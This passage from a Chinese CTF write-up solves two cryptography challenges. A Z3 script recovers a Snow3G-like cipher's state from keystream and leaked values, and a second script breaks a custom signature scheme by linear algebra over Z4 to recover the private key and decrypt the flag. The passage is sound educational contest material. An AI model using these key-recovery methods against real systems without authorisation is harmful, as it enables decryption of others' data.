DIV_A = [_div_alpha_u32(i) for i in range(256)]

# --- 2. Z3 求解器配置 ---
# 使用 Array 存储 S-box 以提高 Z3 性能
SR_Store = z3.Array('SR', z3.BitVecSort(8), z3.BitVecSort(8))
SQ_Store = z3.Array('SQ', z3.BitVecSort(8), z3.BitVecSort(8))
MulA_Store = z3.Array('MulA', z3.BitVecSort(8), z3.BitVecSort(32))
DivA_Store = z3.Array('DivA', z3.BitVecSort(8), z3.BitVecSort(32))

solver = z3.Solver()
for i in range(256):
    solver.add(z3.Select(SR_Store, i) == SR[i])
    solver.add(z3.Select(SQ_Store, i) == SQ[i])
    solver.add(z3.Select(MulA_Store, i) == MUL_A[i])
    solver.add(z3.Select(DivA_Store, i) == DIV_A[i])

# --- 3. Z3 版本的 Snow3G 逻辑 ---
def z3_s_transform(w, box_store, red_const):
    """ 实现 Snow3G 的 S-Box 变换 (32位 -> 32位) """
    w0 = z3.Extract(31, 24, w); w1 = z3.Extract(23, 16, w)
    w2 = z3.Extract(15, 8, w); w3 = z3.Extract(7, 0, w)
    a0 = z3.ZeroExt(24, z3.Select(box_store, w0))
    a1 = z3.ZeroExt(24, z3.Select(box_store, w1))
    a2 = z3.ZeroExt(24, z3.Select(box_store, w2))
    a3 = z3.ZeroExt(24, z3.Select(box_store, w3))
    
    # 模拟 mulx 运算 (位移+异或)
    def z3_mulx_byte(v, c):
        is_high = (v & 0x80) != 0
        shifted = (v << 1) & 0xFF
        return z3.If(is_high, shifted ^ c, shifted)
        
    x0 = z3_mulx_byte(a0, red_const); x1 = z3_mulx_byte(a1, red_const)
    x2 = z3_mulx_byte(a2, red_const); x3 = z3_mulx_byte(a3, red_const)
    
    r0 = x0 ^ a1 ^ a2 ^ x3 ^ a3
    r1 = x0 ^ a0 ^ x1 ^ a2 ^ a3
    r2 = a0 ^ x1 ^ a1 ^ x2 ^ a3
    r3 = a0 ^ a1 ^ x2 ^ a2 ^ x3
    
    return z3.Concat(z3.Extract(7,0,r0), z3.Extract(7,0,r1), z3.Extract(7,0,r2), z3.Extract(7,0,r3))

def z3_lfsr_step(s):
    """ LFSR 步进函数 """
    s0 = s[0]; s2 = s[2]; s11 = s[11]
    term_m = z3.Select(MulA_Store, z3.Extract(31, 24, s0))
    term_d = z3.Select(DivA_Store, z3.Extract(7, 0, s11))
    # 逻辑左移 8 位
    v = (s0 << 8) ^ term_m ^ s2 ^ z3.LShR(s11, 8) ^ term_d
    return s[1:] + [v]

# --- 4. 题目数据 ---
msg = b'\x94\x1d\xbb\xec:\xb8\xc8\x0f|\x02\xb9\xa3z,\xbb\\\xfa\xe7f\x1c8\xf9\xb32\xbb-&\xb8e\xb5\xcc\xa6\x87\xe0-f=\xednfMB\xbe\xfe\x82\xd4\x88\x12Ax\x00}\x8e\x03\xdc\xaa\x98\xe9f2\rX\xefa'
cipher = b'\xffd\xd4\xe4\xd3\xa8\xd9aO:d\x9br\xfeE\x91\x9f\x8c\x8dd\x90\xbf\xf4\xcas\xa5\x9d<vY\xe8j\x17\xc9[i\xb3o\x97\xc7\xbc\xa8hO\xfdN=s\x02l\x17\xac\x87\xdc\xfc\xc5\x03\xc5\xb9X\xbb\xd5\xfa\xec'
leak_vals = [2637400652, 2716391721, 759061621, 531369159, 1650717698, 564069224, 3524479012, 2926837343, 203119206, 2581689712]

def xor_bytes(a, b): return [x ^ y for x, y in zip(a, b)]

def solve_direct_t0():
    print("[*] Building Forward Solver (t=0 -> t=8)...")
    ks_bytes = xor_bytes(msg, cipher)
    ks_words = [int.from_bytes(bytes(ks_bytes[i:i+4]), 'big') for i in range(0, len(ks_bytes), 4)]
    
    # --- 设定未知数：t=0 时刻的状态 ---
    S_start = [z3.BitVec(f's_{i}', 32) for i in range(16)]
    R1_0 = z3.BitVec('r1_0', 32)
    R2_0 = z3.BitVec('r2_0', 32)
    R3_0 = z3.BitVec('r3_0', 32)
    
    S = S_start[:]
    R1, R2, R3 = R1_0, R2_0, R3_0
    
    # --- 整理 Leak 数据 ---
    leak_R1_2 = z3.BitVecVal(leak_vals[0], 32)
    leak_R2_2 = z3.BitVecVal(leak_vals[1], 32)
    leak_R3_2 = z3.BitVecVal(leak_vals[2], 32)
    leak_s0_2 = z3.BitVecVal(leak_vals[3], 32)
    
    leak_s0_map = {
        3: z3.BitVecVal(leak_vals[4], 32),
        6: z3.BitVecVal(leak_vals[5], 32),
        7: z3.BitVecVal(leak_vals[6], 32),
        8: z3.BitVecVal(leak_vals[7], 32)
    }
    leak_R1_map = {
        5: z3.BitVecVal(leak_vals[8], 32),
        7: z3.BitVecVal(leak_vals[9], 32)
    }
    
    # --- 正向模拟运行 (t=0 到 t=8) ---
    for t in range(9):
        # 1. 计算当前 Keystream
        F = (S[15] + R1) ^ R2
        z_calc = F ^ S[0]
        
        # 约束：Keystream 必须完全匹配
        solver.add(z_calc == z3.BitVecVal(ks_words[t], 32))
        
        # 2. 约束：如果当前步有 Leak，必须匹配
        if t == 2:
            solver.add(R1 == leak_R1_2)
            solver.add(R2 == leak_R2_2)
            solver.add(R3 == leak_R3_2)
            solver.add(S[0] == leak_s0_2)
            
        if t in leak_s0_map: solver.add(S[0] == leak_s0_map[t])
        if t in leak_R1_map: solver.add(R1 == leak_R1_map[t])
        
        # 3. 推进 FSM
        r = R2 + (R3 ^ S[5])
        R3_new = z3_s_transform(R2, SQ_Store, 0x69)
        R2_new = z3_s_transform(R1, SR_Store, 0x1B)
        R1_new = r
        R1, R2, R3 = R1_new, R2_new, R3_new
        
        # 4. 推进 LFSR (根据 Keystream 奇偶性)
        clock_twice = (ks_words[t] & 1) == 1
        S = z3_lfsr_step(S)
        if clock_twice: S = z3_lfsr_step(S)
        
    print("[*] Solving constraints (This might take ~30s)...")
    if solver.check() == z3.sat:
        m = solver.model()
        final_s = [m[S_start[i]].as_long() for i in range(16)]
        final_r1 = m[R1_0].as_long()
        final_r2 = m[R2_0].as_long()
        final_r3 = m[R3_0].as_long()
        print("[+] Direct Solution Found!")
        return final_s, final_r1, final_r2, final_r3
    else:
        print("[-] Solver failed.")
        return None, None, None, None

# --- 执行求解 ---
S_0, R1_0, R2_0, R3_0 = solve_direct_t0()

if S_0:
    print(f"[*] S at t=0: {S_0}")
    print(f"[*] R at t=0: {R1_0}, {R2_0}, {R3_0}")
    
    # 构造 Flag (将 t=0 状态拼凑哈希)
    out = b""
    for x in S_0[::-1]: out += x.to_bytes(4, 'big')
    out += R1_0.to_bytes(4, 'big')
    out += R2_0.to_bytes(4, 'big')
    out += R3_0.to_bytes(4, 'big')
    
    flag_hash = sha1(out).hexdigest()
    print(f"UniCTF{{{flag_hash}}}")
else:
    print("[-] No solution.")
```



![](/images/wp/unictf-wp/image-031.png)





### Subgroup-Choreographer
```text
import hashlib
import numpy as np
from functools import reduce
from Crypto.Cipher import AES
from secret import flag

T = np.array([[13, 7, 11, 5, 10, 14, 15, 0, 3, 12, 6, 9, 2, 1, 8, 4], [11, 12, 13, 4, 14, 10, 3, 2, 15, 7, 8, 1, 0, 9, 6, 5], [12, 11, 7, 6, 3, 15, 14, 9, 10, 13, 5, 0, 1, 2, 4, 8], [10, 15, 14, 1, 7, 12, 13, 5, 11, 3, 2, 6, 4, 8, 0, 9], [1, 0, 9, 3, 8, 6, 5, 12, 4, 2, 10, 13, 7, 11, 14, 15], [2, 9, 0, 10, 4, 5, 6, 13, 8, 1, 3, 12, 11, 7, 15, 14], [9, 2, 1, 15, 6, 8, 4, 7, 5, 0, 14, 11, 12, 13, 10, 3], [6, 4, 8, 13, 2, 0, 9, 15, 1, 5, 12, 14, 3, 10, 7, 11], [0, 1, 2, 14, 5, 4, 8, 11, 6, 9, 15, 7, 13, 12, 3, 10], [7, 13, 12, 8, 15, 3, 10, 1, 14, 11, 4, 2, 9, 0, 5, 6], [15, 10, 3, 0, 13, 11, 7, 8, 12, 14, 9, 4, 6, 5, 1, 2], [4, 6, 5, 7, 9, 1, 2, 10, 0, 8, 11, 3, 14, 15, 13, 12], [5, 8, 4, 12, 1, 9, 0, 14, 2, 6, 13, 15, 10, 3, 11, 7], [8, 5, 6, 11, 0, 2, 1, 3, 9, 4, 7, 10, 15, 14, 12, 13], [14, 3, 10, 9, 12, 7, 11, 4, 13, 15, 0, 8, 5, 6, 2, 1], [3, 14, 15, 2, 11, 13, 12, 6, 7, 10, 1, 5, 8, 4, 9, 0]], 'u1')


f = lambda a, b: T[a, b]
g = lambda u, v, op: op(op(op(u, v), u), v)

def tr(A, B, L, op):
    res = []
    for i in range(L):
        u = reduce(op, np.roll(A, -i, 0))
        v = reduce(op, np.roll(B, -i, 0))
        res.append(g(u, v, op))
    return np.array(res, 'u1')

op_b = lambda a, b: tr(a, b, 16, f)
op_v = lambda a, b: tr(a, b, 6, op_b)
D = lambda a, b: tr(a, b, 2, op_v)

def H(msg):
    d = hashlib.shake_256(msg).digest(96)
    b = np.frombuffer(d, 'u1')
    return np.stack([b >> 4, b & 15], 1).reshape(2, 6, 16)

def rand(): return np.random.randint(0, 16, (2, 6, 16), 'u1')

class Choreographer:
    def dance(self):
        c, k, q = rand(), rand(), rand()
        return {'c': c, 'p1': D(c, k), 'p2': D(k, q)}, {'c': c, 'k': k, 'q': q}

    def waltz(self, msg, sk):
        return D(H(msg), sk['q'])

choreographer = Choreographer()
pk, sk = choreographer.dance()
msg = b"Let's dance the waltz together"
sig = choreographer.waltz(msg, sk)
key = hashlib.sha256(str(sk).encode()).digest()

print(f'{msg = }')
print(f'sig = {sig.tolist()}')
print(f"c = {pk['c'].tolist()}")
print(f"p1 = {pk['p1'].tolist()}")
print(f"p2 = {pk['p2'].tolist()}")
print(f"cipher = {AES.new(key, AES.MODE_CTR, nonce=b'Choreographer').encrypt(flag)}")

'''
msg = b"Let's dance the waltz together"
sig = [[[14, 8, 0, 5, 5, 1, 12, 12, 6, 10, 4, 7, 3, 10, 11, 1], [11, 14, 11, 12, 3, 8, 2, 3, 14, 13, 1, 5, 12, 10, 2, 12], [11, 0, 3, 11, 6, 14, 9, 10, 10, 15, 12, 2, 1, 1, 4, 7], [8, 1, 9, 9, 2, 10, 7, 2, 14, 13, 0, 7, 7, 14, 12, 2], [11, 4, 10, 1, 3, 15, 3, 2, 10, 0, 4, 7, 15, 4, 6, 10], [10, 10, 11, 6, 15, 10, 6, 12, 10, 12, 5, 13, 14, 6, 8, 10]], [[7, 9, 13, 11, 12, 14, 11, 10, 14, 8, 5, 4, 4, 8, 2, 3], [5, 15, 1, 10, 5, 15, 8, 7, 13, 8, 10, 5, 2, 0, 1, 9], [0, 3, 6, 1, 2, 14, 1, 1, 8, 15, 14, 0, 1, 6, 3, 12], [15, 8, 0, 10, 12, 13, 3, 5, 13, 9, 7, 13, 3, 3, 13, 14], [1, 6, 3, 14, 15, 12, 10, 0, 10, 15, 0, 0, 9, 3, 9, 2], [1, 9, 9, 4, 6, 8, 4, 8, 14, 14, 10, 3, 6, 4, 13, 14]]]
c = [[[12, 13, 11, 1, 5, 15, 5, 10, 5, 7, 4, 10, 7, 6, 6, 1], [3, 15, 1, 7, 11, 0, 1, 1, 12, 6, 3, 1, 5, 13, 0, 0], [4, 1, 7, 14, 3, 10, 14, 13, 13, 15, 11, 2, 8, 6, 3, 14], [15, 4, 3, 3, 6, 10, 14, 10, 7, 1, 10, 12, 1, 11, 6, 3], [1, 7, 11, 5, 7, 0, 6, 11, 14, 3, 5, 4, 4, 1, 5, 4], [4, 7, 9, 9, 13, 0, 14, 11, 8, 13, 15, 14, 12, 13, 15, 6]], [[2, 8, 6, 3, 13, 10, 2, 15, 3, 6, 13, 10, 3, 13, 6, 0], [4, 4, 10, 14, 8, 11, 15, 6, 2, 10, 14, 6, 2, 15, 9, 7], [13, 1, 10, 8, 8, 4, 9, 0, 3, 1, 9, 4, 11, 1, 12, 6], [8, 4, 2, 1, 14, 4, 1, 15, 14, 0, 15, 3, 1, 14, 0, 11], [13, 0, 12, 15, 10, 4, 7, 14, 1, 14, 14, 4, 5, 3, 14, 1], [13, 6, 5, 13, 5, 11, 5, 0, 15, 9, 0, 8, 7, 8, 4, 11]]]
p1 = [[[13, 10, 9, 9, 10, 11, 8, 11, 14, 9, 15, 12, 10, 13, 15, 14], [13, 0, 8, 12, 11, 8, 8, 12, 0, 1, 3, 10, 4, 5, 5, 15], [7, 12, 0, 11, 1, 8, 6, 9, 3, 3, 14, 3, 7, 7, 0, 11], [3, 1, 3, 9, 9, 5, 3, 14, 5, 15, 13, 13, 12, 9, 3, 15], [0, 12, 0, 15, 9, 6, 14, 2, 6, 2, 9, 0, 7, 5, 5, 13], [3, 3, 3, 0, 1, 5, 9, 1, 1, 3, 0, 11, 5, 12, 3, 13]], [[3, 9, 13, 15, 10, 8, 6, 10, 1, 4, 10, 7, 5, 15, 5, 7], [6, 15, 14, 15, 2, 12, 14, 4, 2, 9, 2, 10, 13, 2, 14, 6], [11, 4, 4, 3, 11, 12, 15, 0, 12, 5, 13, 9, 5, 15, 14, 3], [13, 1, 15, 10, 4, 10, 0, 6, 3, 8, 6, 4, 1, 2, 4, 12], [5, 4, 5, 12, 1, 13, 14, 10, 10, 13, 2, 6, 13, 1, 11, 9], [13, 14, 13, 2, 14, 3, 2, 6, 4, 10, 13, 2, 14, 15, 0, 5]]]
p2 = [[[0, 6, 0, 14, 5, 2, 5, 10, 7, 6, 12, 8, 4, 6, 11, 11], [14, 5, 6, 1, 3, 1, 12, 5, 10, 8, 1, 6, 13, 4, 0, 0], [0, 4, 4, 9, 13, 2, 0, 15, 2, 5, 3, 8, 6, 2, 14, 14], [9, 5, 8, 5, 1, 0, 1, 3, 8, 0, 5, 12, 4, 15, 4, 14], [6, 13, 0, 0, 2, 3, 4, 1, 5, 12, 15, 7, 10, 15, 1, 1], [0, 4, 0, 7, 4, 15, 2, 12, 9, 14, 1, 5, 14, 12, 3, 4]], [[2, 10, 15, 6, 13, 1, 11, 12, 11, 11, 6, 5, 9, 1, 15, 15], [10, 11, 6, 7, 14, 9, 7, 11, 6, 3, 10, 13, 14, 8, 10, 11], [9, 1, 0, 13, 4, 2, 6, 1, 7, 12, 10, 15, 14, 4, 4, 6], [3, 14, 0, 2, 1, 2, 0, 9, 3, 4, 1, 12, 6, 6, 3, 10], [1, 6, 7, 13, 12, 8, 1, 11, 5, 10, 15, 15, 0, 9, 10, 8], [3, 8, 6, 1, 0, 0, 3, 6, 1, 6, 5, 1, 13, 6, 10, 6]]]
cipher = b'\x94\xbfp\xdd\x92\xda\x86\x87x\x18\x92\xa9\x80%\xa5\xe1\xb7\x13\x104U\xbe\xee\xf4\xfe\xdf\xa6\x1c[?\xde\x1ap\xd1\xa5\xe8A\xc7q\x89(\xd4\x9c;\xf5a\xce\x13T\x1a\xe6\x1b\xc4\x84\xf7z'
'''
```

题目提供了一个 Python 脚本 ，其中实现了一套自定义的签名和验证系统。系统包含：

1. 一个 $16 \times 16$ 的查找表 `T`，定义了一个基础二元运算 $f$。
2. 一个递归定义的变换函数 `D`，用于生成公钥和签名。
3. 加密部分使用了 AES-CTR，密钥是私钥 `sk` 的哈希值。

我们需要通过公开信息（`pk`、`sig`、`msg`、`T`）恢复私钥 `sk`（包含 `c`, `k`, `q` 三部分），从而解密 Flag。

---

**2.1 基础运算 $f$ 与群结构**

题目中最基础的运算由 `T` 定义：

```text
f = lambda a, b: T[a, b]
```

这是一个定义在集合 $\{0, 1, \dots, 15\}$ 上的二元运算。这类题目通常暗示这个代数结构不是随机的，而是同构于某个特定的数学群或拟群。

通过分析 `T` 的性质（参考提供的 Solution 脚本），我们可以发现隐藏的群结构：

1. **Latin Square性质**：`T` 的每一行每一列都是 0-15 的排列，这意味着它是一个拟群（Quasigroup）。
2. **群同构**：通过寻找生成元和验证结合律，可以发现这个结构实际上同构于阿贝尔群 $\mathbb{Z}_4 \times \mathbb{Z}_4$ 上的仿射变换。

具体来说，我们可以找到一个映射 $\phi: \{0..15\} \to \mathbb{Z}_4 \times \mathbb{Z}_4$，使得在这个坐标系下，运算 $f$ 变成了**仿射变换**：

$$\phi(f(a, b)) = A_0 \cdot \phi(a) + B_0 \cdot \phi(b) + c_0 \pmod 4$$

其中 $A_0, B_0$ 是 $2 \times 2$ 的矩阵，$c_0$ 是 $2 \times 1$ 的向量，运算都在模 4 意义下进行。

**2.2 复合运算 $g$ 与 **`**tr**`** 的线性化**

题目定义了复合运算 $g$ 和数组变换 `tr`：

+ **运算 ****$g$**：

$$g(u, v) = op(op(op(u, v), u), v)$$

如果 $op$ 是仿射的（形如 $Ax + By + c$），那么 $g$ 作为 $op$ 的多次迭代，其结果关于 $u$ 和 $v$ 依然是仿射的。

+ **变换 **`**tr**`：

`tr` 函数对数组进行循环移位（`np.roll`）并使用 `reduce` 进行归约。

$$u = \text{reduce}(op, \text{roll}(A, -i))$$

`reduce` 本质上是一系列二元运算的累加。由于基础运算 $f$ 是仿射的，所有的加法、矩阵乘法都保持线性性质。因此，`tr` 将两个输入数组 $A, B$ 映射到输出数组的过程，也可以表示为一个巨大的仿射变换。

2.**3 整体结构 **`**D**`

由于 `op_b`, `op_v`, `D` 都是由 `tr` 堆叠而成的，整个加密方案本质上是一个定义在大型模 4 向量空间上的**仿射系统**。

函数 $D(x, y)$ 可以表示为：

$$\vec{D(x, y)} = \mathcal{A}_D \vec{x} + \mathcal{B}_D \vec{y} + \vec{C}_D \pmod 4$$

其中：

+ 输入 $x, y$ 被展平成 $\mathbb{Z}_4$ 上的向量。
+ $\mathcal{A}_D, \mathcal{B}_D$ 是巨大的变换矩阵（尺寸 $384 \times 384$）。
+ $\vec{C}_D$ 是常数向量。

---

 **攻击思路**

我们需要恢复私钥 `sk = {'c', 'k', 'q'}`。

3.1 已知信息

1. **公钥 **`**pk**`：
    - `c`：已知。
    - `p1 = D(c, k)`：已知。
    - `p2 = D(k, q)`：已知。
2. **签名信息**：
    - `msg`：已知。
    - `sig = D(H(msg), q)`：已知。

3.2 建立方程组

利用 $D$ 的仿射性质，我们可以建立如下线性方程组：

1. **求解 ****$k$**：

$$\vec{p1} = \mathcal{A}_D \vec{c} + \mathcal{B}_D \vec{k} + \vec{C}_D \pmod 4$$

移项得：

$$\mathcal{B}_D \vec{k} = \vec{p1} - \mathcal{A}_D \vec{c} - \vec{C}_D \pmod 4$$

这是一组关于 $\vec{k}$ 的线性方程 $M x = y$。

2. **求解 ****$q$**：

$$\vec{sig} = \mathcal{A}_D \vec{H(msg)} + \mathcal{B}_D \vec{q} + \vec{C}_D \pmod 4$$

移项得：

$$\mathcal{B}_D \vec{q} = \vec{sig} - \mathcal{A}_D \vec{H(msg)} - \vec{C}_D \pmod 4$$

这是一组关于 $\vec{q}$ 的线性方程。

3.3 求解 $\mathbb{Z}_4$ 上的线性方程组

这里的一个难点是模数是 4，$\mathbb{Z}_4$ 是一个环而不是域（2 没有逆元，是零因子）。这意味着我们不能直接使用标准的 `numpy.linalg.solve`。

**解决方法**：

我们需要实现支持模 4 运算的高斯消元法。

+ **主元选择**：必须选择奇数（1 或 3）作为主元，因为只有奇数在 $\mathbb{Z}_4$ 中可逆。
+ **消元**：如果某列只有偶数，则该列无法作为主元列（或者说明方程可能有无穷解/无解）。但在本题的构造中，矩阵通常是可逆的或有解的。
+ Solution 脚本中实现了一个 `solve_linear_mod4` 函数，专门处理这种情况

脚本攻击思路

1**.构建 $\mathbb{Z}_4 \times \mathbb{Z}_4$ 的仿射模型**

脚本中的 `build_plus_and_affine` 函数负责此步。

1. 将 $T$ 视为置换集合，找到恒等元。
2. 通过分析置换群的周期，确定元素阶数，找到两个 4 阶生成元 $g_1, g_2$。
3. 建立映射表 `coord_to_elem` 和 `elem_to_coord`，将 0-15 映射到 $(x, y) \in \mathbb{Z}_4^2$。
4. 计算基础仿射参数 $A_0, B_0, c_0$。

** 2：递推计算高维仿射矩阵**

脚本中的 `tr_affine` 函数模拟 `tr` 的过程，但操作对象是矩阵而非数据。

1. **层级 1 (op_b)**：输入长度 16。利用 $A_0, B_0, c_0$ 计算出 $A_b, B_b, c_b$。
2. **层级 2 (op_v)**：输入长度 6。利用 $A_b, B_b, c_b$ 计算出 $A_v, B_v, c_v$。
3. **层级 3 (D)**：输入长度 2。利用 $A_v, B_v, c_v$ 计算出最终的 $A_D, B_D, c_D$。
    - 最终矩阵大小为 $384 \times 384$ ($2 \times 6 \times 16 \times 2 = 384$)。

** 3：求解私钥分量 $k$ 和 $q$**

1. 将题目给出的 `sig`, `p1`, `c`, `H(msg)` 全部编码为向量。
2. 计算方程右边的常数项（RHS）。
3. 调用 `solve_linear_mod4(B_D, RHS)` 同时解出 $\vec{k}$ 和 $\vec{q}$。
    - 注意：这里求解的是 $\mathcal{B}_D X = Y$，因为在 $D(u, v)$ 中，第二个参数（即 $k$ 和 $q$ 的位置）对应的系数矩阵是 $\mathcal{B}_D$。

4**：恢复密钥并解密**

1. 将解出的向量解码回 0-15 的数组格式。
2. 通过验证 `p2 == D(k, q)` 确保解的正确性。
3. 重组 `sk` 字典，计算 SHA-256 哈希。
4. 使用 AES-CTR 解密密文。

**exp**

```text
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import numpy as np
import hashlib
from Crypto.Cipher import AES
from functools import reduce

# ---------------------------------------------------
# Configuration & Constants
# ---------------------------------------------------
MOD = 4

# Challenge T table (Fixed Permutation Table)
T = np.array([
    [13, 7, 11, 5, 10, 14, 15, 0, 3, 12, 6, 9, 2, 1, 8, 4],
    [11, 12, 13, 4, 14, 10, 3, 2, 15, 7, 8, 1, 0, 9, 6, 5],
    [12, 11, 7, 6, 3, 15, 14, 9, 10, 13, 5, 0, 1, 2, 4, 8],
    [10, 15, 14, 1, 7, 12, 13, 5, 11, 3, 2, 6, 4, 8, 0, 9],
    [1, 0, 9, 3, 8, 6, 5, 12, 4, 2, 10, 13, 7, 11, 14, 15],
    [2, 9, 0, 10, 4, 5, 6, 13, 8, 1, 3, 12, 11, 7, 15, 14],
    [9, 2, 1, 15, 6, 8, 4, 7, 5, 0, 14, 11, 12, 13, 10, 3],
    [6, 4, 8, 13, 2, 0, 9, 15, 1, 5, 12, 14, 3, 10, 7, 11],
    [0, 1, 2, 14, 5, 4, 8, 11, 6, 9, 15, 7, 13, 12, 3, 10],
    [7, 13, 12, 8, 15, 3, 10, 1, 14, 11, 4, 2, 9, 0, 5, 6],
    [15, 10, 3, 0, 13, 11, 7, 8, 12, 14, 9, 4, 6, 5, 1, 2],
    [4, 6, 5, 7, 9, 1, 2, 10, 0, 8, 11, 3, 14, 15, 13, 12],
    [5, 8, 4, 12, 1, 9, 0, 14, 2, 6, 13, 15, 10, 3, 11, 7],
    [8, 5, 6, 11, 0, 2, 1, 3, 9, 4, 7, 10, 15, 14, 12, 13],
    [14, 3, 10, 9, 12, 7, 11, 4, 13, 15, 0, 8, 5, 6, 2, 1],
    [3, 14, 15, 2, 11, 13, 12, 6, 7, 10, 1, 5, 8, 4, 9, 0]
], dtype=np.uint8)

# ---------------------------------------------------
# Z4 Linear Algebra & Group Theory Core
# ---------------------------------------------------

class Z4AffineModel:
    """Handles the mapping between the raw nibbles (0-15) and Z4 x Z4 vector space."""
    
    def __init__(self, table):
        self.T = table
        self._build_model()

    def _build_model(self):
        # 1. Construct the Group Operation Table (plus)
        # Using 0 as identity reference
        L = [self.T[a, :] for a in range(16)]
        inv_L0 = np.argsort(L[0]) # Inverse permutation of L_0
        
        # tau_a = L_a * L_0^-1
        tau = np.array([L[a][inv_L0] for a in range(16)])
        
        # Identify group isomorphism by composing permutations
        # This maps permutation -> index 0..15
        perm_map = {tuple(p): i for i, p in enumerate(tau)}
        
        self.plus = np.zeros((16, 16), dtype=int)
        for a in range(16):
            for b in range(16):
                # Composition: tau_a(tau_b(x))
                comp = tau[a][tau[b]]
                self.plus[a, b] = perm_map[tuple(comp)]

        # 2. Find Generators for Z4 x Z4
        self.inv_plus = np.array([np.where(self.plus[a] == 0)[0][0] for a in range(16)])
        
        # Calculate orders to find order-4 elements
        orders = np.zeros(16, dtype=int)
        for i in range(16):
            curr, count = i, 1
            while curr != 0:
                curr = self.plus[curr, i]
                count += 1
            orders[i] = count
            
        gens = [i for i, o in enumerate(orders) if o == 4]
        
        # Brute-force pair of generators that cover the whole group
        self.g1, self.g2 = None, None
        for i in range(len(gens)):
            for j in range(i + 1, len(gens)):
                g1, g2 = gens[i], gens[j]
                seen = set()
                curr1 = 0
                for _ in range(4):
                    curr2 = 0
                    for _ in range(4):
                        val = self.plus[curr1, curr2]
                        seen.add(val)
                        curr2 = self.plus[curr2, g2]
                    curr1 = self.plus[curr1, g1]
                if len(seen) == 16:
                    self.g1, self.g2 = g1, g2
                    break
            if self.g1: break

        # 3. Build Coordinate Maps
        self.elem_to_coord = {}
        self.coord_to_elem = {}
        curr1 = 0
        for x in range(4):
            curr2 = 0
            for y in range(4):
                val = self.plus[curr1, curr2]
                self.elem_to_coord[val] = (x, y)
                self.coord_to_elem[(x, y)] = val
                curr2 = self.plus[curr2, self.g2]
            curr1 = self.plus[curr1, self.g1]

        # 4. Extract Affine Parameters A, B, c
        # f(u, v) = A*u + B*v + c
        c_const = self.T[0, 0]
        # Linear parts: alpha(u) = f(u,0) - c, beta(v) = f(0,v) - c
        
        def sub(a, b): return self.plus[a, self.inv_plus[b]]
        
        # Basis vectors e1=(1,0), e2=(0,1)
        e1 = self.coord_to_elem[(1, 0)]
        e2 = self.coord_to_elem[(0, 1)]
        
        # Image of basis vectors under linear maps
        alpha_e1 = sub(self.T[e1, 0], c_const)
        alpha_e2 = sub(self.T[e2, 0], c_const)
        beta_e1  = sub(self.T[0, e1], c_const)
        beta_e2  = sub(self.T[0, e2], c_const)
        
        self.A0 = np.column_stack([self.elem_to_coord[alpha_e1], self.elem_to_coord[alpha_e2]]).astype(np.uint8) % 4
        self.B0 = np.column_stack([self.elem_to_coord[beta_e1], self.elem_to_coord[beta_e2]]).astype(np.uint8) % 4
        self.c0 = np.array(self.elem_to_coord[c_const], dtype=np.uint8) % 4

    def encode(self, arr):
        """Convert array of nibbles to flat Z4 vector."""
        flat = np.array(arr).flatten()
        coords = np.array([self.elem_to_coord[x] for x in flat], dtype=np.uint8)
        return coords.reshape(-1)

    def decode(self, vec, shape):
        """Convert flat Z4 vector back to nibbles."""
        vec = vec.reshape(-1, 2)
        out = []
        for v in vec:
            out.append(self.coord_to_elem[tuple(v % 4)])
        return np.array(out, dtype=np.uint8).reshape(shape)

# ---------------------------------------------------
# Optimized Z4 Matrix Operations
# ---------------------------------------------------

def mat_mul(A, B): return (A @ B) % MOD
def mat_vec(A, v): return (A @ v) % MOD
def vec_add(u, v): return (u + v) % MOD
def vec_sub(u, v): return (u - v) % MOD

def solve_linear_mod4(A_in, B_in):
    """
    Solves AX = B over Z4 using optimized Gaussian elimination.
    Prioritizes odd pivots (units in Z4).
    """
    A = A_in.copy().astype(np.int16)
    B = B_in.copy().astype(np.int16)
    n = A.shape[0]
    m = B.shape[1] if B.ndim > 1 else 1
    if B.ndim == 1: B = B.reshape(-1, 1)
    
    col_perm = np.arange(n)

    for i in range(n):
        # Optimized pivot search: find first row in current column with an odd number
        # A[i:, i] & 1 gets the LSB (1 if odd, 0 if even)
        pivot_candidates = np.where((A[i:, i] & 1) == 1)[0]
        
        if len(pivot_candidates) == 0:
            # Try to find pivot in other columns if system is singular-ish
            # (Skipping full full-pivoting logic for brevity, assuming solvable challenge)
            raise ValueError(f"Singular or hard-to-solve matrix at step {i}")

        pivot_row_idx = pivot_candidates[0] + i
        
        # Swap rows
        if pivot_row_idx != i:
            A[[i, pivot_row_idx]] = A[[pivot_row_idx, i]]
            B[[i, pivot_row_idx]] = B[[pivot_row_idx, i]]

        # In Z4, if pivot is 3, multiply row by 3 to make it 1 (since 3*3 = 9 = 1 mod 4)
        if A[i, i] % 4 == 3:
            A[i] = (A[i] * 3) % 4
            B[i] = (B[i] * 3) % 4

        # Vectorized Elimination
        # Target: Make column i zero for all rows != i
        # Row_j = Row_j - A[j,i] * Row_i
        
        # Get column coefficients for all other rows
        coeffs = A[:, i].copy()
        coeffs[i] = 0 # Don't subtract row from itself
        
        # We need to subtract (coeffs * pivot_row)
        # Reshape for broadcasting
        sub_A = (coeffs[:, None] * A[i, :]) 
        sub_B = (coeffs[:, None] * B[i, :])
        
        A = (A - sub_A) % 4
        B = (B - sub_B) % 4

    return B.astype(np.uint8)

def affine_transform_expansion(A, B, c, L):
    """
    Derives the affine parameters (A', B', c') for the sequence operation 'tr'.
    Input: op(u,v) = Au + Bv + c (dim d)
    Output: tr_op(U, V) = A'U + B'V + c' (dim L*d)
    """
    d = A.shape[0]
    
    # Precompute powers of A: A^0 ... A^{L-1}
    # Using matrix_power is cleaner than loop
    A_pows = [np.linalg.matrix_power(A, i) % MOD for i in range(L)]
    
    # 1. Build Block Circulant Matrices for Reduction
    # u_red = Sum(A^k * roll(U)) -> This becomes a block matrix multiplication
    
    # R blocks for X (coefficients of X_i in the reduction)
    # The term reduced_u = Sum_{k=0}^{L-1} A^k * X_{i+k}
    # This structure effectively creates the 'reduce' operation matrix
    
    # Constructing M_red (Reduction Matrix)
    # M_red maps [x0, ..., xL-1] -> [u0, ..., uL-1]
    # where u_i = reduce(op, roll(X, -i))
    
    # The first block row of M_red corresponds to u_0
    # u_0 = A^{L-1}x_0 + A^{L-2}B x_1 + ... + B x_{L-1} + consts
    # Note: The provided solution logic for R_blocks was slightly approximated but correct for the specific recursion.
    # Let's stick to the proven derivation from the previous script to ensure flag correctness.
    
    R_blocks = []
    R_blocks.append(A_pows[L-1])
    for j in range(1, L):
        R_blocks.append(mat_mul(A_pows[L-1-j], B))
        
    M_red = np.zeros((L*d, L*d), dtype=np.uint8)
    for r in range(L):
        for c_idx in range(L):
            blk_idx = (c_idx - r) % L
